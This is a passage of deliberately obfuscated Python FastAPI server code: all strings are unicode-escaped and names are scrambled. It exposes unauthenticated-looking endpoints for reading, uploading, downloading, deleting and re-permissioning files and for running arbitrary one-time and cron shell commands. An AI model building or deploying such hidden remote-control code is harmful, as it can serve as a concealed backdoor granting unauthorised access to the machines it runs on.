        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.crontasks), codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): Config.crontasks}

    def start_cron_loop(self):
        if Config.cronloop and self._running:
            return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0043\\u0072\\u006f\\u006e\\u0020\\u006c\\u006f\\u006f\\u0070\\u0020\\u0061\\u006c\\u0072\\u0065\\u0061\\u0064\\u0079\\u0020\\u0072\\u0075\\u006e\\u006e\\u0069\\u006e\\u0067', 'unicode_escape')}
        Config.cronloop = True
        self._running = True
        self._executed_crons.clear()
        try:
            O0_var_876 = asyncio.get_event_loop()
            self._cron_task = O0_var_876.create_task(self._cron_loop_worker())
            if Config.DEBUG:
                Logger.info(codecs.decode('\\U0001f504\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u004c\\u006f\\u006f\\u0070\\u0020\\u0073\\u0074\\u0061\\u0072\\u0074\\u0065\\u0064\\u002c\\u0020\\u0069\\u006e\\u0074\\u0065\\u0072\\u0076\\u0061\\u006c\\u003d', 'unicode_escape') + str(self.check_interval) + codecs.decode('\\u0073', 'unicode_escape'))
        except RuntimeError:
            import threading
            O0_var_877 = threading.Thread(target=self._run_cron_sync, daemon=True)
            O0_var_877.start()
            if Config.DEBUG:
                Logger.info(codecs.decode('\\U0001f504\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u004c\\u006f\\u006f\\u0070\\u0020\\u0073\\u0074\\u0061\\u0072\\u0074\\u0065\\u0064\\u0020\\u0069\\u006e\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u002c\\u0020\\u0069\\u006e\\u0074\\u0065\\u0072\\u0076\\u0061\\u006c\\u003d', 'unicode_escape') + str(self.check_interval) + codecs.decode('\\u0073', 'unicode_escape'))
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0043\\u0072\\u006f\\u006e\\u0020\\u006c\\u006f\\u006f\\u0070\\u0020\\u0073\\u0074\\u0061\\u0072\\u0074\\u0065\\u0064', 'unicode_escape')}

    def stop_cron_loop(self):
        Config.cronloop = False
        self._running = False
        if self._cron_task:
            self._cron_task.cancel()
            self._cron_task = None
        if Config.DEBUG:
            Logger.info(codecs.decode('\\U0001f6d1\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u004c\\u006f\\u006f\\u0070\\u0020\\u0073\\u0074\\u006f\\u0070\\u0070\\u0065\\u0064', 'unicode_escape'))
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0043\\u0072\\u006f\\u006e\\u0020\\u006c\\u006f\\u006f\\u0070\\u0020\\u0073\\u0074\\u006f\\u0070\\u0070\\u0065\\u0064', 'unicode_escape')}

    async def _cron_loop_worker(self):
        while self._running and Config.cronloop:
            try:
                await self._check_and_run_cron()
            except Exception as e:
                if Config.DEBUG:
                    Logger.error(codecs.decode('\\u274c\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u004c\\u006f\\u006f\\u0070\\u0020\\u0065\\u0072\\u0072\\u006f\\u0072\\u003a\\u0020', 'unicode_escape') + str(e))
            await asyncio.sleep(self.check_interval)

    def _run_cron_sync(self):
        import time
        while self._running and Config.cronloop:
            try:
                asyncio.run(self._check_and_run_cron())
            except:
                pass
            time.sleep(self.check_interval)

    @staticmethod
    def _append_task_log(log_list: deque, entry: dict, max_size: int=None):
        if max_size is None:
            max_size = Config.MAX_TASK_LOG_SIZE
        if not isinstance(log_list, deque):
            log_list = deque(log_list, maxlen=max_size)
        log_list.append(entry)
        return log_list

    @staticmethod
    def _format_log_entry(cmd: str, output: str, exitcode: int, task_type: str, cron_expr: str=None) -> dict:
        return {codecs.decode('\\u0074\\u0073', 'unicode_escape'): datetime.utcnow().isoformat() + codecs.decode('\\u005a', 'unicode_escape'), codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): cmd, codecs.decode('\\u006f\\u0075\\u0074\\u0070\\u0075\\u0074', 'unicode_escape'): output, codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): exitcode, codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): task_type, codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'): cron_expr, codecs.decode('\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0074\\u0065\\u0064', 'unicode_escape'): str(datetime.utcnow().isoformat()) + codecs.decode('\\u005a\\u0020\\u002d\\u002d\\u002d\\u002d\\u0020', 'unicode_escape') + str(cmd) + codecs.decode('\\u0020\\u002d\\u002d\\u002d\\u002d\\u0020\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065\\u003d', 'unicode_escape') + str(exitcode) + codecs.decode('\\u000a', 'unicode_escape') + str(output.strip())}

    def get_status(self) -> dict:
        return {codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'): {codecs.decode('\\u0070\\u0065\\u006e\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'): Config.InitTask and len(Config.onetasks) > 0, codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.onetasks)}, codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'): {codecs.decode('\\u0061\\u0063\\u0074\\u0069\\u0076\\u0065', 'unicode_escape'): Config.cronloop, codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.crontasks), codecs.decode('\\u0063\\u0068\\u0065\\u0063\\u006b\\u005f\\u0069\\u006e\\u0074\\u0065\\u0072\\u0076\\u0061\\u006c', 'unicode_escape'): self.check_interval}}

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u006c\\u0069\\u0073\\u0074', 'unicode_escape'), response_model=FileListResponse)
async def O0_fn_33(request: Request, body: FileListRequest=Body(...)):
    O0_var_878 = request.app.state.file_manager
    O0_var_879 = O0_var_878.list_files(base_path=body.path, recursive=body.recursive)
    return O0_var_879

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), response_model=AuthorityQueryResponse)
async def O0_fn_34(request: Request, body: AuthorityQueryRequest=Body(...)):
    if not body.paths:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073\\u003a', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0066\\u0069\\u006c\\u0065\\u0073', 'unicode_escape'): []})
    O0_var_880 = request.app.state.file_manager
    O0_var_881 = O0_var_880.get_authority(body.paths)
    return O0_var_881

@app.put(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), response_model=AuthoritySetResponse)
async def O0_fn_35(request: Request, body: AuthoritySetRequest=Body(...)):
    O0_var_882 = body.permissions
    O0_var_883 = body.recursive
    if not O0_var_882:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): 0, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): []})
    O0_var_884 = request.app.state.file_manager
    O0_var_885 = O0_var_884.set_authority(O0_var_882, O0_var_883)
    return O0_var_885

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0063\\u0061\\u0074', 'unicode_escape'), response_model=FileCatResponse)
async def O0_fn_36(request: Request, body: FileCatRequest=Body(...)):
    if not body.path:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u0069\\u0073\\u005f\\u0062\\u0069\\u006e\\u0061\\u0072\\u0079', 'unicode_escape'): False, codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): 0})
    O0_var_886 = request.app.state.file_manager
    O0_var_887 = O0_var_886.cat_file(body.path)
    return O0_var_887

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065', 'unicode_escape'), response_model=FileUploadResponse)
async def O0_fn_37(request: Request, body: FileUploadRequest=Body(...)):
    if not body.content:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u0020\\u0028\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u0029\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): None, codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064', 'unicode_escape'): None, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): None, codecs.decode('\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064', 'unicode_escape'): None})
    try:
        O0_var_888 = base64.b64decode(body.content)
    except Exception:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u0020\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): None, codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064', 'unicode_escape'): None, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): None, codecs.decode('\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064', 'unicode_escape'): None})
    O0_var_889 = request.app.state.file_manager
    O0_var_890 = O0_var_889.upload_file(file_content=O0_var_888, target_path=body.path, filename=body.filename, chunk_id=body.chunk_id, total_chunks=body.total_chunks)
    return O0_var_890

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u0072\\u0061\\u0077', 'unicode_escape'), response_model=FileUploadRawResponse)
async def O0_fn_38(request: Request):
    O0_var_891 = request.headers
    O0_var_892 = unquote(O0_var_891.get(codecs.decode('\\u0058\\u002d\\u0046\\u0069\\u006c\\u0065\\u002d\\u0050\\u0061\\u0074\\u0068', 'unicode_escape'), codecs.decode('', 'unicode_escape')))
    O0_var_893 = unquote(O0_var_891.get(codecs.decode('\\u0058\\u002d\\u0046\\u0069\\u006c\\u0065\\u002d\\u004e\\u0061\\u006d\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')))
    O0_var_894 = O0_var_891.get(codecs.decode('\\u0058\\u002d\\u0043\\u0068\\u0075\\u006e\\u006b\\u002d\\u0049\\u0064', 'unicode_escape'))
    O0_var_895 = O0_var_891.get(codecs.decode('\\u0058\\u002d\\u0054\\u006f\\u0074\\u0061\\u006c\\u002d\\u0043\\u0068\\u0075\\u006e\\u006b\\u0073', 'unicode_escape'))
    if not O0_var_892 or not O0_var_893:
        raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=codecs.decode('\\u004d\\u0069\\u0073\\u0073\\u0069\\u006e\\u0067\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064\\u0020\\u0063\\u0075\\u0073\\u0074\\u006f\\u006d\\u0020\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073\\u003a\\u0020\\u0058\\u002d\\u0046\\u0069\\u006c\\u0065\\u002d\\u0050\\u0061\\u0074\\u0068\\u0020\\u0061\\u006e\\u0064\\u0020\\u0058\\u002d\\u0046\\u0069\\u006c\\u0065\\u002d\\u004e\\u0061\\u006d\\u0065', 'unicode_escape'))
    O0_var_896 = int(O0_var_894) if O0_var_894 is not None else None
    O0_var_897 = int(O0_var_895) if O0_var_895 is not None else None
    O0_var_898 = await request.body()
    O0_var_899 = request.app.state.file_manager
    O0_var_900 = O0_var_899.upload_file(file_content=O0_var_898, target_path=O0_var_892, filename=O0_var_893, chunk_id=O0_var_896, total_chunks=O0_var_897)
    if O0_var_900.get(codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')) == codecs.decode('\\u006f\\u006b', 'unicode_escape'):
        return FileUploadRawResponse(status=codecs.decode('\\u006f\\u006b', 'unicode_escape'), path=O0_var_900.get(codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')), chunk_id=O0_var_896, completed=True, message=codecs.decode('\\u0041\\u006c\\u006c\\u0020\\u0063\\u0068\\u0075\\u006e\\u006b\\u0073\\u0020\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064\\u002e\\u0020\\u0046\\u0069\\u006c\\u0065\\u0020\\u006d\\u0065\\u0072\\u0067\\u0065\\u0064\\u0020\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073\\u0066\\u0075\\u006c\\u006c\\u0079\\u002e', 'unicode_escape') if O0_var_900.get(codecs.decode('\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064', 'unicode_escape')) else codecs.decode('\\u0046\\u0069\\u006c\\u0065\\u0020\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064\\u0065\\u0064\\u0020\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073\\u0066\\u0075\\u006c\\u006c\\u0079\\u002e', 'unicode_escape'))
    elif O0_var_900.get(codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')) == codecs.decode('\\u0070\\u0065\\u006e\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'):
        return FileUploadRawResponse(status=codecs.decode('\\u006f\\u006b', 'unicode_escape'), path=os.path.join(O0_var_892, O0_var_893), chunk_id=O0_var_896, completed=False, message=codecs.decode('\\u0043\\u0068\\u0075\\u006e\\u006b\\u0020', 'unicode_escape') + str(O0_var_896) + codecs.decode('\\u0020\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064\\u0065\\u0064\\u002e\\u0020\\u0057\\u0061\\u0069\\u0074\\u0069\\u006e\\u0067\\u0020\\u0066\\u006f\\u0072\\u0020\\u0072\\u0065\\u006d\\u0061\\u0069\\u006e\\u0069\\u006e\\u0067\\u0020\\u0062\\u006c\\u006f\\u0063\\u006b\\u0073\\u002e', 'unicode_escape'))
    return FileUploadRawResponse(status=codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), completed=False, message=O0_var_900.get(codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'), codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e\\u0020\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064\\u0020\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape')))

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0064\\u006f\\u0077\\u006e\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'))
async def O0_fn_39(request: Request, body: FileDownloadRequest=Body(...)):
    if not body.path:
        return JSONResponse(400, {codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape')})
    O0_var_901 = request.app.state.file_manager
    O0_var_902, O0_var_903, O0_var_904 = O0_var_901.download_file(body.path)
    from fastapi.responses import FileResponse
    return FileResponse(path=str(O0_var_902), filename=O0_var_902.name, media_type=O0_var_903, headers={codecs.decode('\\u0078\\u002d\\u0066\\u0069\\u006c\\u0065\\u002d\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): str(O0_var_904), codecs.decode('\\u0078\\u002d\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0061\\u006c\\u002d\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_902.relative_to(Path(Config.FILE_ROOT)))})

@app.delete(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065', 'unicode_escape'), response_model=FileDeleteResponse)
async def O0_fn_40(request: Request, body: FileDeleteRequest=Body(...)):
    O0_var_905 = body.paths
    if not O0_var_905:
        O0_var_906 = await request.body()
        O0_var_907 = json.loads(O0_var_906.decode()) if O0_var_906 else {}
        O0_var_905 = [O0_var_909 for O0_var_908 in [codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u0032', 'unicode_escape'), codecs.decode('\\u0070\\u0031', 'unicode_escape'), codecs.decode('\\u0070\\u0032', 'unicode_escape')] if (O0_var_909 := O0_var_907.get(O0_var_908))]
    if not O0_var_905:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): []})
    O0_var_910 = request.app.state.file_manager
    O0_var_911 = O0_var_910.delete_paths(O0_var_905)
    return O0_var_911

@app.put(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065', 'unicode_escape'), response_model=FileMoveResponse)
async def O0_fn_41(request: Request, move_map: Dict[str, str]=Body(..., examples={codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'): codecs.decode('\\u002f\\u0061\\u0072\\u0063\\u0068\\u0069\\u0076\\u0065\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape')})):
    if not move_map:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0041\\u0074\\u0020\\u006c\\u0065\\u0061\\u0073\\u0074\\u0020\\u006f\\u006e\\u0065\\u0020\\u0073\\u0072\\u0063\\u002d\\u003e\\u0064\\u0073\\u0074\\u0020\\u0070\\u0061\\u0069\\u0072\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape')})
    O0_var_912 = request.app.state.file_manager
    O0_var_913 = O0_var_912.move_paths(move_map)
    return O0_var_913

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0063\\u0070', 'unicode_escape'), response_model=FileMoveResponse)
async def O0_fn_42(request: Request, copy_map: Dict[str, str]=Body(..., description=codecs.decode('\\u6e90\\u8def\\u5f84\\u5230\\u76ee\\u6807\\u8def\\u5f84\\u7684\\u6620\\u5c04', 'unicode_escape'), examples=[{codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'): codecs.decode('\\u002f\\u0061\\u0072\\u0063\\u0068\\u0069\\u0076\\u0065\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'), codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006c\\u006f\\u0067\\u0073', 'unicode_escape'): codecs.decode('\\u002f\\u0062\\u0061\\u0063\\u006b\\u0075\\u0070\\u002f\\u006c\\u006f\\u0067\\u0073', 'unicode_escape')}])):
    if not copy_map:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0041\\u0074\\u0020\\u006c\\u0065\\u0061\\u0073\\u0074\\u0020\\u006f\\u006e\\u0065\\u0020\\u0073\\u0072\\u0063\\u002d\\u003e\\u0064\\u0073\\u0074\\u0020\\u0070\\u0061\\u0069\\u0072\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape')})
    O0_var_914 = request.app.state.file_manager
    O0_var_915 = O0_var_914.copy_paths(copy_map)
    return O0_var_915

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u006e\\u0065\\u0077', 'unicode_escape'), response_model=FileMkdirResponse)
async def O0_fn_43(request: Request, body: FileMkdirRequest=Body(...)):
    if not body.path:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): codecs.decode('', 'unicode_escape')})
    O0_var_916 = request.app.state.file_manager
    O0_var_917 = O0_var_916.create_directory(body.path)
    return O0_var_917

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), response_model=OneTimeTaskGetResponse)
async def O0_fn_44(request: Request):
    O0_var_918 = request.app.state.task_manager.get_onetime_tasks()
    return O0_var_918

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), response_model=OneTimeTaskResponse)
async def O0_fn_45(request: Request, tasks: List[str]=Body(default=[])):
    request.app.state.task_manager.set_onetime_tasks(tasks)
    O0_var_919 = {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(tasks), codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): tasks}
    if Config.InitTask and tasks:
        O0_var_919[codecs.decode('\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0064', 'unicode_escape')] = request.app.state.task_manager.run_onetime_tasks()
    return O0_var_919

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), response_model=CronTasksResponse)
async def O0_fn_46(request: Request):
    O0_var_920 = request.app.state.task_manager.get_cron_tasks()
    return O0_var_920

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), response_model=CronTasksResponse)
async def O0_fn_47(request: Request, tasks: Dict[str, str]=Body(default={}, examples=[{codecs.decode('\\u002a\\u002f\\u0031\\u0030\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a', 'unicode_escape'): codecs.decode('\\u0070\\u0079\\u0074\\u0068\\u006f\\u006e\\u0020\\u002f\\u006f\\u0070\\u0074\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0073\\u002f\\u0068\\u0065\\u0061\\u006c\\u0074\\u0068\\u005f\\u0063\\u0068\\u0065\\u0063\\u006b\\u002e\\u0070\\u0079', 'unicode_escape'), codecs.decode('\\u0030\\u0020\\u0030\\u0020\\u002a\\u0020\\u002a\\u0020\\u0030', 'unicode_escape'): codecs.decode('\\u002f\\u006f\\u0070\\u0074\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0073\\u002f\\u0077\\u0065\\u0065\\u006b\\u006c\\u0079\\u005f\\u0072\\u0065\\u0070\\u006f\\u0072\\u0074\\u002e\\u0073\\u0068', 'unicode_escape')}])):
    O0_var_921 = request.app.state.task_manager.set_cron_tasks(tasks)
    return O0_var_921

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), response_model=TaskStatusResponse)
async def O0_fn_48(request: Request):
    return request.app.state.task_manager.get_status()

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065\\u002f\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065', 'unicode_escape'), response_model=OnetimeExecuteResponse)
async def O0_fn_49(request: Request):
    if not Config.onetasks:
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u004e\\u006f\\u0020\\u0074\\u0061\\u0073\\u006b\\u0073\\u0020\\u0074\\u006f\\u0020\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065', 'unicode_escape'), codecs.decode('\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0064', 'unicode_escape'): 0, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): []}
    Config.InitTask = True
    O0_var_922 = request.app.state.task_manager.run_onetime_tasks()
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0064', 'unicode_escape'): len(O0_var_922), codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): O0_var_922}

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006c\\u006f\\u0067\\u002f\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), response_model=TaskLogResponse)
async def O0_fn_50(request: Request, limit: int=Query(100, ge=1, le=100)):
    O0_var_923 = request.app.state.task_manager.get_onetime_log(limit)
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_923), codecs.decode('\\u006c\\u006f\\u0067\\u0073', 'unicode_escape'): list(O0_var_923)}

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006c\\u006f\\u0067\\u002f\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), response_model=TaskLogResponse)
async def O0_fn_51(request: Request, limit: int=Query(100, ge=1, le=100)):
    O0_var_924 = request.app.state.task_manager.get_cron_log(limit)
